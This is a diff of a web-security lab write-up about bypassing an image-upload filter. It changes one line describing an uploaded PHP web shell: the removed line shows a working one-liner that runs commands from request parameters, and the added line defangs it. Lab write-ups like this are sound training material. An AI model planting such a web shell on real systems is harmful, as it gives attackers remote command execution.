@@ -22,7 +22,7 @@ This lab contains a vulnerable image upload function. It attempts to prevent use
 
 ## 5. Execution
 
-- tried to upload a php shell file I already had which had the contents of ```<?php system($_REQUEST['cmd']); ?>```
+- tried to upload a php shell file I already had which had the contents of ```<?php s_y_s_t_e_m($_REQUEST['cmd']); ?>```
 
 ![](images/uploading_shell_php.png)
 
